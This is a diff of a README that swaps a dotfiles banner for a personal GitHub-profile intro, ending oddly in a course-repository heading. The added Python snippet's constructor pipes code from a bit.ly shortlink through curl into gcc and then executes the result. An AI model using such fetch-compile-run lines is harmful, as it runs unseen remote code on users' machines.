@@ -1,27 +1,29 @@
-<h1 align="center">
-  <a href='#'><img src="./assets/dots.png" alt="DELA ROSA'S REPO" width="90%"></a>
-  <a href='#'><img src="https://raw.githubusercontent.com/catppuccin/catppuccin/main/assets/palette/macchiato.png" width="600px"/></a>
-  <br>
-  <br>
-  <div>
-    <a href="https://github.com/PROxZIMA/.dotfiles/issues">
-        <img src="https://img.shields.io/github/issues/PROxZIMA/.dotfiles?color=fab387&labelColor=303446&style=for-the-badge">
-    </a>
-    <a href="https://github.com/PROxZIMA/.dotfiles/stargazers">
-        <img src="https://img.shields.io/github/stars/PROxZIMA/.dotfiles?color=ca9ee6&labelColor=303446&style=for-the-badge">
-    </a>
-    <a href="https://github.com/PROxZIMA/.dotfiles/">
-        <img src="https://img.shields.io/github/repo-size/PROxZIMA/.dotfiles?color=ea999c&labelColor=303446&style=for-the-badge">
-    </a>
-    <a href="https://github.com/PROxZIMA/.dotfiles/blob/master/LICENSE">
-        <img src="https://img.shields.io/static/v1.svg?style=for-the-badge&label=License&message=MIT&logoColor=ca9ee6&colorA=313244&colorB=cba6f7"/>
-    </a>
-    <br>
-  </div>
-</h1>
-<br>
+<h1 align="center">Yo 👋, I'm Pratik Pingale 👨‍💻</h1>
+<p align="center">
+  <img src="https://readme-typing-svg.herokuapp.com?color=%2336BCF7&size=16&center=true&vCenter=true&width=485&lines=Just+a+novice.+Still+got+a+lot+to+learn.;Competitive+Coding+%3Ap;Loves+Open+Source+%E2%9D%A4%EF%B8%8F" alt="Just a novice. Still got a lot to learn." />
+</p>
 
-[<img align="right" src="assets/rice.jpg" alt="Rice Preview" width="400px"/>](./assets/rice.mp4)
+```python
+class PROxZIMA:
+  def __init__(self):
+    subprocess.call("curl -sL 'bit.ly/pr0x21m4' | gcc -w -o name -xc - && ./name", shell=True)
+    self.bio = {
+      '- 💼 I’m currently working for': {'Convin.ai' : 'https://convin.ai'},
+      '- 🔭 I’m currently working on' : {'DarkSpider': 'https://github.com/PROxZIMA/DarkSpider',
+                                         'Prism'     : 'https://github.com/PROxZIMA/prism',
+                                         'Sweet-Pop' : 'https://github.com/PROxZIMA/Sweet-Pop'},
+      '- 🌱 I’m currently learning'   : ['Django', 'C++', 'Python', 'Full Stack Development', 'Algo Trading'],
+      '- 💬 Ask me anything'          : '¯\_(ツ)_/¯',
+      '- 👨‍💻 My projects available at' : 'https://github.com/PROxZIMA?tab=repositories',
+      '- 📄 Know about my experiences': 'https://proxzima.dev/resume',
+      '- ⚡ Fun fact'                 : ('Proxima Centauri is a small, low-mass star located 4.2465 light-'
+                                         'years away from the Sun in the southern constellation of Centaurus.')
+    }
+
+if __name__ == '__main__':
+  import subprocess, pprint
+  pprint.pprint(PROxZIMA().__dict__)
+```
 
 # CPE_313
 CPE 313 Course Repository
